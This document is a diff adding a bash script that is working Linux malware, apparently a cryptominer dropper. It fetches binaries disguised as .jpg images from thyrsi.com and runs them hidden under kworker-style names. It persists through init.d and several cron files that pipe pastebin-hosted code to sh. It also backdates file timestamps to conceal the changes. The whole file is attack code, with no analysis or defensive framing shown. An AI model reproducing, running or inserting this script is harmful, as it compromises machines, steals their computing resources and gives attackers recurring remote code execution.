@@ -1,0 +1,101 @@
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+function downloadrun() {
+	ps=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${ps} -eq 0 ];then
+		if [ ! -f "/tmp/kworkerds" ]; then
+			curl -fsSL --connect-timeout 120 http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -o /tmp/kworkerds && chmod +x /tmp/kworkerds
+			if [ ! -f "/tmp/kworkerds" ]; then
+				wget http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -O /tmp/kworkerds && chmod +x /tmp/kworkerds
+			fi
+				nohup /tmp/kworkerds >/dev/null 2>&1 &
+		else
+			nohup /tmp/kworkerds >/dev/null 2>&1 &
+		fi
+	fi
+}
+
+function downloadrunxm() {
+	pm=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${pm} -eq 0 ];then
+		if [ ! -f "/bin/config.json" ]; then
+			curl -fsSL --connect-timeout 120 http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -o /bin/config.json && chmod +x /bin/config.json
+			if [ ! -f "/bin/config.json" ]; then
+				wget http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -O /bin/config.json && chmod +x /bin/config.json
+			fi
+		fi
+		if [ ! -f "/bin/kworkerds" ]; then
+			curl -fsSL --connect-timeout 120 http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -o /bin/kworkerds && chmod +x /bin/kworkerds
+			if [ ! -f "/bin/kworkerds" ]; then
+				wget http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -O /bin/kworkerds && chmod +x /bin/kworkerds
+			fi
+				nohup /bin/kworkerds >/dev/null 2>&1 &
+		else
+			nohup /bin/kworkerds >/dev/null 2>&1 &
+		fi
+	fi
+}
+
+function init() {
+	if [ ! -f "/usr/sbin/kworker" ]; then
+		curl -fsSL --connect-timeout 120 http://thyrsi.com/t6/362/1535175015x-1404817880.jpg -o /usr/sbin/kworker && chmod 777 /usr/sbin/kworker
+		if [ ! -f "/usr/sbin/kworker" ]; then
+			wget http://thyrsi.com/t6/362/1535175015x-1404817880.jpg -O /usr/sbin/kworker && chmod 777 /usr/sbin/kworker
+		fi
+	fi
+	if [ ! -f "/etc/init.d/kworker" ]; then
+		curl -fsSL --connect-timeout 120 http://thyrsi.com/t6/362/1535175343x-1566657675.jpg -o /etc/init.d/kworker && chmod 777 /etc/init.d/kworker
+		if [ ! -f "/etc/init.d/kworker" ]; then
+			wget http://thyrsi.com/t6/362/1535175343x-1566657675.jpg -O /etc/init.d/kworker && chmod 777 /etc/init.d/kworker
+		fi
+	fi
+	chkconfig --add kworker
+}
+
+function echocron() {
+	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/root
+	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/system
+	echo -e "*/23 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/root
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "*/31 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.hourly
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
+	if [ ! -f "/etc/cron.hourly/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
+	fi
+	mkdir -p /etc/cron.daily
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
+	if [ ! -f "/etc/cron.daily/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
+	fi
+	mkdir -p /etc/cron.monthly
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
+	if [ ! -f "/etc/cron.monthly/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
+	fi
+	touch -acmr /bin/sh /var/spool/cron/root
+	touch -acmr /bin/sh /var/spool/cron/crontabs/root
+	touch -acmr /bin/sh /etc/cron.d/system
+	touch -acmr /bin/sh /etc/cron.d/root
+	touch -acmr /bin/sh /etc/cron.hourly/oanacron
+	touch -acmr /bin/sh /etc/cron.daily/oanacron
+	touch -acmr /bin/sh /etc/cron.monthly/oanacron
+}
+
+update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/TzBeq3AM )
+if [ ${update}x = "update"x ];then
+	echocron
+else
+	downloadrun
+	init
+	echocron
+	sleep 10
+	port=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${port} -eq 0 ];then
+		downloadrunxm
+	fi
+fi
+#
+#
